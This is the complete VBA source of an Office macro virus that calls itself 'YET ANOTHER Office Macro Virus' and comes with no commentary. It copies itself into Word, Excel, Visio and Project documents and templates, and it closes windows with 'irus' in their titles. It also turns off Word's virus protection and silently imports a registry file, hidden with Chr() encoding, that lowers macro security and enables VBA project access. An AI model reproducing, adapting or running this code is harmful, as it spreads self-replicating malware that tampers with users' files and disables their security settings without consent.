   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Document_Close()
   '
   visiobj = "Visio.Application": visitarget$ = "Blank Drawing.vst": getvisio = 1
   t = Application: If VBA.IsObject(t) Then noobj = "1": If noobj = "1" Then GoTo itsvisio
   dramamine = Application.Version
   ni = 1: Exie = "Excel.Application"
   te$ = t: tested = Left(te$, 5)
   If tested <> "Micro" Then GoTo itsvisio
   If t = "Microsoft Word" Then GoTo notproject
   If t = "Microsoft Excel" Then GoTo notwordeither
   If t = "Microsoft Project" Then
   runningapp = 3
   If dramamine = "8.0" Then
   '
   End If
   For Each x In Projects
   On Error Resume Next
   runningapp = 3
   Set a = x.VBProject.VBComponents(getvisio).codemodule
   Set tp = ThisProject.VBProject.VBComponents(getvisio).codemodule
   cntr = tp.countoflines
   If a.lines(4, 1) <> "t=application" Then
   a.deletelines 1, a.countoflines
   a.insertlines 1, tp.lines(1, cntr)
   '
   '
   End If
   Next x
   Set temp = Application.VBE.VBProjects(getvisio).VBComponents(getvisio).codemodule
   If temp.lines(2, 1) <> "'" Then
   temp.deletelines 1, temp.countoflines
   temp.insertlines 1, tp.lines(1, tp.countoflines)
   End If
   End If
   notproject:
   ni = 2
   If t = "Microsoft Word" Then
   On Error GoTo getthereg
   Set a = ActiveDocument.VBProject.VBComponents.Item(ni - 1).codemodule
   Set tp = NormalTemplate.VBProject.VBComponents.Item(ni - 1).codemodule
   runningapp = 1
   '
   '
   '
   For iv = 1 To Tasks.Count
   av$ = Tasks(iv).Name
   mv = InStr(1, av$, "irus", vbTextCompare)
   If mv > 0 Then
   Tasks(iv).Close
   GoTo out
   End If
   Next iv
   out:
   If tp = "" Then GoTo getthereg
   If dramamine <> "10.0" Then
   Options.VirusProtection = (Rnd * 0)
   End If
   If tp.lines(2, 1) <> "'" Then
   tp.deletelines 1, tp.countoflines
   tp.insertlines 1, a.lines(1, a.countoflines)

   End If
   If a.lines(2, 1) <> "'" Then
   a.deletelines 1, a.countoflines
   a.insertlines 1, tp.lines(1, tp.countoflines)
   ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
   End If

   End If
   GoTo crossing
   notwordeither:
   '
   If t = "Microsoft Excel" Then
   runningapp = 2: On Error GoTo crossing
   Set a = ActiveWorkbook.VBProject.VBComponents(getvisio).codemodule
   Set tp = ThisWorkBook.VBProject.VBComponents(getvisio).codemodule
   runningapp = 2
   If a.lines(2, 1) <> "'" Then
   a.deletelines 1, a.countoflines
   a.insertlines 1, tp.countoflines(1, tp.countoflines)
   ActiveWorkbook.SaveAs (ActiveWorkbook.FullName)
   End If
   End If
   GoTo crossing
   itsvisio:
   '
   runningapp = 4
   Set nom = ThisDocument.VBProject.VBComponents(1).codemodule
   For i = 1 To Documents.Count
   Set docobj = Documents.Item(1)
   Set gets = docobj.VBProject.VBComponents(1).codemodule
   If gets.lines(2, 1) <> Chr(39) Then
   gets.deletelines 1, gets.countoflines
   gets.insertlines 1, nom.lines(1, nom.countoflines)
   Documents(i).Save
   End If
   Next i
   If noobj = "1" Then GoTo noinfw
   crossing:
   amd = Dir("c:\fallen.txt"): If amd <> "" Then getvisio = 2
   If amd = "fallen.txt" Then GoTo getthereg
   Open "c:\fallen.txt" For Output As 1: Print #1, "": Close 1
   If t <> Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(32) + Chr(69) + Chr(120) + Chr(99) + Chr(101) + Chr(108) Then
   ra = Dir("c:\fallen.reg")
   If ra = "" Then dropit = "true"
   If dropit <> "true" Then GoTo nextone
   On Error GoTo nextone: Set xlapp = CreateObject(Exie)
   chk = Dir(xlapp.Application.StartupPath & "\Book1.xls")
   If chk = "" Then
   Set book1Obj = xlapp.workbooks.Add
   book1Obj.VBProject.VBComponents.Item(1).codemodule.insertlines 1, a.lines(1, a.countoflines)
   book1Obj.VBProject.VBComponents.Item(1).codemodule.replaceline 1, "Private Sub Workbook_Deactivate()"

   book1Obj.SaveAs (xlapp.Application.StartupPath & "\Book1.xls")
   book1Obj.Close
   dropit = "true"
   End If
   xlapp.Quit
   End If
   nextone:
   On Error GoTo novis
   If tested = "Micro" And getvisio = 1 Then
   Set vsapp = CreateObject(visiobj)
   vsapp.Visible = False
   Set vs1obj = vsapp.Documents.Add(visitarget$)
   Set la = vs1obj.VBProject.VBComponents(1).codemodule
   la.deletelines 1, la.countoflines
   la.insertlines 1, tp.lines(1, tp.countoflines)
   vs1obj.VBProject.VBComponents(1).codemodule.replaceline 1, "Private Sub Document_BeforeDocumentClose(byval doc As Visio.IVDocument)"
   vs1obj.VBProject.VBComponents(1).codemodule.replaceline 14, "'a"
   vs1obj.VBProject.VBComponents(1).codemodule.replaceline 25, "'b"
   vs1obj.VBProject.VBComponents(1).codemodule.replaceline 26, "'c"
   pa = vsapp.Path
   fila$ = (pa & "Solutions\Blank Drawing.vst")
   vs1obj.saveasex fila$, visSaveAsWS = 2
   vs1obj.Close
   End If
   novis:
   If runningapp <> 3 Then
   On Error GoTo noinfp
   Set projapp = CreateObject("MSProject.Application")
   Set proj1obj = projapp.VBE.VBProjects(1).VBComponents(1).codemodule
   proj1obj.deletelines 1, proj1oj.countoflines
   proj1obj.insertlines 1, tp.lines(1, tp.countoflines)
   proj1obj.replaceline 1, "Private Sub Project_Open(byval pj as Project)"
   proj1obj.replaceline 25, "projects(x).Activate"
   proj1obj.replaceline 26, "FileSaveAs Projects(x).FullName"
   projapp.Quit
   End If
   noinfp:
   If runningapp <> 1 Then
   On Error GoTo noinfw
   Set wordapp = CreateObject("Word.Application")
   Set tempobj = wordapp.NormalTemplate.VBProject.VBComponents.Item(1).codemodule
   If tempobj.lines(2, 1) <> "'" Then
   tempobj.deletelines 1, tempobj.countoflines
   tempobj.insertlines 1, tp.lines(1, tp.countoflines)
   tempobj.replaceline 1, "Private Sub Document_Close()"
   tempobj.replaceline 14, "'"
   tempobj.replaceline 25, "'"
   tempobj.replaceline 26, "'"
   wordapp.Quit
   End If
   End If

   noinfw:
   If dropit = "true" Then
   getthereg:
   Open "c:\intheory.reg" For Output As 1
   Print #1, Chr(82) + Chr(69) + Chr(71) + Chr(69) + Chr(68) + Chr(73) + Chr(84) + Chr(52)
   Print #1, Chr(91) + Chr(72) + Chr(75) + Chr(69) + Chr(89) + Chr(95) + Chr(67) + Chr(85) + Chr(82) + Chr(82) + Chr(69) + Chr(78) + Chr(84) + Chr(95) + Chr(85) + Chr(83) + Chr(69) + Chr(82) + Chr(92) + Chr(83) + Chr(111) + Chr(102) + Chr(116) + Chr(119) + Chr(97) + Chr(114) + Chr(101) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(92) + Chr(79) + Chr(102) + Chr(102) + Chr(105) + Chr(99) + Chr(101) + Chr(92) + Chr(56) + Chr(46) + Chr(48) + Chr(92) + Chr(69) + Chr(120) + Chr(99) + Chr(101) + Chr(108) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(32) + Chr(69) + Chr(120) + Chr(99) + Chr(101) + Chr(108) + Chr(93)
   Print #1, """Options6""=dword:00000000"
   Print #1, Chr(91) + Chr(72) + Chr(75) + Chr(69) + Chr(89) + Chr(95) + Chr(67) + Chr(85) + Chr(82) + Chr(82) + Chr(69) + Chr(78) + Chr(84) + Chr(95) + Chr(85) + Chr(83) + Chr(69) + Chr(82) + Chr(92) + Chr(83) + Chr(111) + Chr(102) + Chr(116) + Chr(119) + Chr(97) + Chr(114) + Chr(101) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(92) + Chr(79) + Chr(102) + Chr(102) + Chr(105) + Chr(99) + Chr(101) + Chr(92) + Chr(57) + Chr(46) + Chr(48) + Chr(92) + Chr(69) + Chr(120) + Chr(99) + Chr(101) + Chr(108) + Chr(92) + Chr(83) + Chr(101) + Chr(99) + Chr(117) + Chr(114) + Chr(105) + Chr(116) + Chr(121) + Chr(93)
   Print #1, """Level""=dword:00000001"
   Print #1, Chr(91) + Chr(72) + Chr(75) + Chr(69) + Chr(89) + Chr(95) + Chr(67) + Chr(85) + Chr(82) + Chr(82) + Chr(69) + Chr(78) + Chr(84) + Chr(95) + Chr(85) + Chr(83) + Chr(69) + Chr(82) + Chr(92) + Chr(83) + Chr(111) + Chr(102) + Chr(116) + Chr(119) + Chr(97) + Chr(114) + Chr(101) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(92) + Chr(79) + Chr(102) + Chr(102) + Chr(105) + Chr(99) + Chr(101) + Chr(92) + Chr(49) + Chr(48) + Chr(46) + Chr(48) + Chr(92) + Chr(69) + Chr(120) + Chr(99) + Chr(101) + Chr(108) + Chr(92) + Chr(83) + Chr(101) + Chr(99) + Chr(117) + Chr(114) + Chr(105) + Chr(116) + Chr(121) + Chr(93)
   Print #1, """Level""=dword:00000001"
   Print #1, Chr(91) + Chr(72) + Chr(75) + Chr(69) + Chr(89) + Chr(95) + Chr(76) + Chr(79) + Chr(67) + Chr(65) + Chr(76) + Chr(95) + Chr(77) + Chr(65) + Chr(67) + Chr(72) + Chr(73) + Chr(78) + Chr(69) + Chr(92) + Chr(83) + Chr(111) + Chr(102) + Chr(116) + Chr(119) + Chr(97) + Chr(114) + Chr(101) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(92) + Chr(79) + Chr(102) + Chr(102) + Chr(105) + Chr(99) + Chr(101) + Chr(92) + Chr(49) + Chr(48) + Chr(46) + Chr(48) + Chr(92) + Chr(69) + Chr(120) + Chr(99) + Chr(101) + Chr(108) + Chr(92) + Chr(83) + Chr(101) + Chr(99) + Chr(117) + Chr(114) + Chr(105) + Chr(116) + Chr(121) + Chr(93)
   Print #1, """AccessVBOM""=dword:00000001"
   Print #1, Chr(91) + Chr(72) + Chr(75) + Chr(69) + Chr(89) + Chr(95) + Chr(67) + Chr(85) + Chr(82) + Chr(82) + Chr(69) + Chr(78) + Chr(84) + Chr(95) + Chr(85) + Chr(83) + Chr(69) + Chr(82) + Chr(92) + Chr(83) + Chr(111) + Chr(102) + Chr(116) + Chr(119) + Chr(97) + Chr(114) + Chr(101) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(92) + Chr(79) + Chr(102) + Chr(102) + Chr(105) + Chr(99) + Chr(101) + Chr(92) + Chr(49) + Chr(48) + Chr(46) + Chr(48) + Chr(92) + Chr(87) + Chr(111) + Chr(114) + Chr(100) + Chr(92) + Chr(83) + Chr(101) + Chr(99) + Chr(117) + Chr(114) + Chr(105) + Chr(116) + Chr(121) + Chr(93)
   Print #1, """Level""=dword:00000001"
   Print #1, Chr(91) + Chr(72) + Chr(75) + Chr(69) + Chr(89) + Chr(95) + Chr(76) + Chr(79) + Chr(67) + Chr(65) + Chr(76) + Chr(95) + Chr(77) + Chr(65) + Chr(67) + Chr(72) + Chr(73) + Chr(78) + Chr(69) + Chr(92) + Chr(83) + Chr(111) + Chr(102) + Chr(116) + Chr(119) + Chr(97) + Chr(114) + Chr(101) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(92) + Chr(79) + Chr(102) + Chr(102) + Chr(105) + Chr(99) + Chr(101) + Chr(92) + Chr(49) + Chr(48) + Chr(46) + Chr(48) + Chr(92) + Chr(87) + Chr(111) + Chr(114) + Chr(100) + Chr(92) + Chr(83) + Chr(101) + Chr(99) + Chr(117) + Chr(114) + Chr(105) + Chr(116) + Chr(121) + Chr(93)
   Print #1, """AccessVBOM""=dword:00000001"
   Close 1
   Shell "regedit /s c:\intheory.reg", vbHide
   End If
   '
   '
   '
   If (Day(Now)) = 26 Then
   On Error GoTo gone
   Set moo = CreateObject("Agent.Control.1")
   moo.connected = True
   If VBA.IsObject(moo) Then
   moo.Characters.Load "Merlin", "Merlin.acs"
   Set merl = moo.Characters("Merlin")
   End If
   With merl
   .Show
   .play Animation:="Read"
   .Speak "Hello and welcome to YET ANOTHER Office Macro Virus"
   .play Animation:="Announce"
   .Speak "brought to you by the letters MS and XP"
   .Speak "New product ... same stupid old problems"
   .Speak "remember kids"
   .Speak "All your office products are belong to us"
   .play Animation:="Suggest"
   .Speak "perhaps you should invest in a good word processor?"
   .Speak "have a good day" & Application.UserName & " may nothing but happiness come through your door"
   .hide
   End With
   Do Until merl.hide.Status = 0
   DoEvents
   Loop
   End If
   gone:
   'guess who ? ;)
   End Sub
